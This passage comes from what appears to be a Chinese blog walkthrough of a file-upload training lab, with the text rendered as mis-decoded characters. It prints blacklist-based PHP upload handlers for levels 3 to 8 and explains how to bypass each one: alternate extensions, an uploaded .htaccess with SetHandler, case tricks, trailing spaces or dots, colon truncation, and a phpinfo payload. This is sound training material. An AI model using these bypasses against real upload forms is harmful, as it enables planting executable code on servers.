class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="ç¬¬3å…³-php3-phtml"><a href="#ç¬¬3å…³-php3-phtml" class="headerlink" title="ç¬¬3å…³ php3 phtml"></a>ç¬¬3å…³ php3 phtml</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">'.asp'</span>,<span class="string">'.aspx'</span>,<span class="string">'.php'</span>,<span class="string">'.jsp'</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;            </span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                 $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'ä¸å…è®¸ä¸Šä¼ .asp,.aspx,.php,.jspåç¼€æ–‡ä»¶ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>é»‘åå•åˆ¤æ–­ï¼Œäºæ˜¯å°è¯•ç”¨php3,phtmlç»•è¿‡</p><p>apache httpd.confè¿›è¡Œé…ç½®</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php <span class="selector-class">.php</span> <span class="selector-class">.php3</span> .phtml</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/qq_19916577/article/details/46502761" target="_blank" rel="noopener">MimeTypesè¡¨</a></p><p><a href="https://www.waitalone.cn/php-windows-upload.html" target="_blank" rel="noopener">å½“phpé‚‚é€…windowsé€šç”¨ä¸Šä¼ ç¼ºé™·</a></p><p>åœ¨æ–‡ä»¶ä¸Šä¼ æ—¶ï¼Œæˆ‘ä»¬å¾€å¾€ä¼šè€ƒè™‘åˆ°æ–‡ä»¶åæˆªæ–­ï¼Œå¦‚%00 ç­‰..</p><p>å¯èƒ½è¿˜ä¼šç”¨å†’å·(â€œ:â€)å»æˆªæ–­</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">3<span class="selector-class">.php</span><span class="selector-pseudo">:jpg</span></span><br></pre></td></tr></table></figure><p>å†’å·æˆªæ–­äº§ç”Ÿçš„æ–‡ä»¶æ˜¯ç©ºç™½çš„ï¼Œé‡Œé¢å¹¶ä¸ä¼šæœ‰ä»»ä½•çš„å†…å®¹</p><p>ä¼šå†™å…¥ä¸€ä¸ª<code>3.php</code>çš„ç©ºæ–‡ä»¶</p><p><code>&lt;</code> å°±ç­‰äº <code>**</code>,è€Œ<code>*</code>ä»£ç ä»»æ„å­—ç¬¦ï¼Œäºæ˜¯ä¹å¯ä»¥è¿™æ ·ä¿®æ”¹ä¸Šä¼ çš„æ–‡ä»¶åï¼Œå¦‚ä¸‹ï¼š</p><p>ç„¶åä¿®æ”¹åå­—ä¸º</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">3.</span>&lt;&lt;&lt;</span><br><span class="line"><span class="meta">&lt;?</span>php phpinfo();<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="ç¬¬4å…³-htaccess"><a href="#ç¬¬4å…³-htaccess" class="headerlink" title="ç¬¬4å…³ .htaccess"></a>ç¬¬4å…³ .htaccess</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">"php1"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">"pHp1"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//æ”¶å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ !'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ˜¯é»‘åå•ï¼Œä½†å‡ ä¹è¿‡æ»¤äº†æ‰€æœ‰æœ‰é—®é¢˜çš„åç¼€åï¼Œé™¤äº†.htaccessï¼Œäºæ˜¯é¦–å…ˆä¸Šä¼ ä¸€ä¸ª.htaccesså†…å®¹å¦‚ä¸‹çš„æ–‡ä»¶:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute"><span class="nomarkup">SetHandler</span></span> application/x-httpd-php</span><br></pre></td></tr></table></figure><p>ç„¶åéšä¾¿ä¸Šä¼ ä¸€ä¸ªåç¼€éƒ½ä¼šè§£æä¸ºphp</p><h2 id="ç¬¬5å…³-å¤§å°å†™"><a href="#ç¬¬5å…³-å¤§å°å†™" class="headerlink" title="ç¬¬5å…³ å¤§å°å†™"></a>ç¬¬5å…³ å¤§å°å†™</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å¤§å°å†™è§„åˆ™ä¸å…¨ï¼Œå¯ä»¥ä½¿ç”¨<code>phP</code>åç¼€ä¸Šä¼ çªç ´ã€‚</p><h2 id="ç¬¬6å…³-ç©ºæ ¼"><a href="#ç¬¬6å…³-ç©ºæ ¼" class="headerlink" title="ç¬¬6å…³ ç©ºæ ¼"></a>ç¬¬6å…³ ç©ºæ ¼</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>];</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.date(<span class="string">"YmdHis"</span>).rand(<span class="number">1000</span>,<span class="number">9999</span>).$file_ext;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file,$img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ '</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>åˆ©ç”¨Windowsç³»ç»Ÿçš„æ–‡ä»¶åç‰¹æ€§ã€‚æ–‡ä»¶åæœ€åå¢åŠ <strong>ç©ºæ ¼</strong></p><h2 id="ç¬¬7å…³-ç‚¹"><a href="#ç¬¬7å…³-ç‚¹" class="headerlink" title="ç¬¬7å…³ ç‚¹"></a>ç¬¬7å…³ ç‚¹</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span class="line">        $file_ext = str_ireplace(<span class="string">'::$DATA'</span>, <span class="string">''</span>, $file_ext);<span class="comment">//å»é™¤å­—ç¬¦ä¸²::$DATA</span></span><br><span class="line">        $file_ext = trim($file_ext); <span class="comment">//é¦–å°¾å»ç©º</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!in_array($file_ext, $deny_ext)) &#123;</span><br><span class="line">            $temp_file = $_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            $img_path = UPLOAD_PATH.<span class="string">'/'</span>.$file_name;</span><br><span class="line">            <span class="keyword">if</span> (move_uploaded_file($temp_file, $img_path)) &#123;</span><br><span class="line">                $is_upload = <span class="keyword">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                $msg = <span class="string">'ä¸Šä¼ å‡ºé”™ï¼'</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $msg = <span class="string">'æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼'</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $msg = UPLOAD_PATH . <span class="string">'æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼'</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ²¡æœ‰åˆ é™¤ç»“å°¾çš„â€œ.â€ï¼Œåˆ©ç”¨windowsç‰¹æ€§ï¼Œä¼šè‡ªåŠ¨å»æ‰åç¼€åä¸­æœ€åçš„â€.â€ï¼Œå¯åœ¨åç¼€åä¸­åŠ â€.â€ç»•è¿‡</p><h2 id="ç¬¬8å…³-DATA"><a href="#ç¬¬8å…³-DATA" class="headerlink" title="ç¬¬8å…³ DATA"></a>ç¬¬8å…³ DATA</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$is_upload = <span class="keyword">false</span>;</span><br><span class="line">$msg = <span class="keyword">null</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (file_exists(UPLOAD_PATH)) &#123;</span><br><span class="line">        $deny_ext = <span class="keyword">array</span>(<span class="string">".php"</span>,<span class="string">".php5"</span>,<span class="string">".php4"</span>,<span class="string">".php3"</span>,<span class="string">".php2"</span>,<span class="string">".html"</span>,<span class="string">".htm"</span>,<span class="string">".phtml"</span>,<span class="string">".pht"</span>,<span class="string">".pHp"</span>,<span class="string">".pHp5"</span>,<span class="string">".pHp4"</span>,<span class="string">".pHp3"</span>,<span class="string">".pHp2"</span>,<span class="string">".Html"</span>,<span class="string">".Htm"</span>,<span class="string">".pHtml"</span>,<span class="string">".jsp"</span>,<span class="string">".jspa"</span>,<span class="string">".jspx"</span>,<span class="string">".jsw"</span>,<span class="string">".jsv"</span>,<span class="string">".jspf"</span>,<span class="string">".jtml"</span>,<span class="string">".jSp"</span>,<span class="string">".jSpx"</span>,<span class="string">".jSpa"</span>,<span class="string">".jSw"</span>,<span class="string">".jSv"</span>,<span class="string">".jSpf"</span>,<span class="string">".jHtml"</span>,<span class="string">".asp"</span>,<span class="string">".aspx"</span>,<span class="string">".asa"</span>,<span class="string">".asax"</span>,<span class="string">".ascx"</span>,<span class="string">".ashx"</span>,<span class="string">".asmx"</span>,<span class="string">".cer"</span>,<span class="string">".aSp"</span>,<span class="string">".aSpx"</span>,<span class="string">".aSa"</span>,<span class="string">".aSax"</span>,<span class="string">".aScx"</span>,<span class="string">".aShx"</span>,<span class="string">".aSmx"</span>,<span class="string">".cEr"</span>,<span class="string">".sWf"</span>,<span class="string">".swf"</span>,<span class="string">".htaccess"</span>);</span><br><span class="line">        $file_name = trim($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]);</span><br><span class="line">        $file_name = deldot($file_name);<span class="comment">//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹</span></span><br><span class="line">        $file_ext = strrchr($file_name, <span class="string">'.'</span>);</span><br><span class="line">        $file_ext = strtolower($file_ext); <span class="comment">//è½¬æ¢ä¸ºå°å†™</span></span><br><span 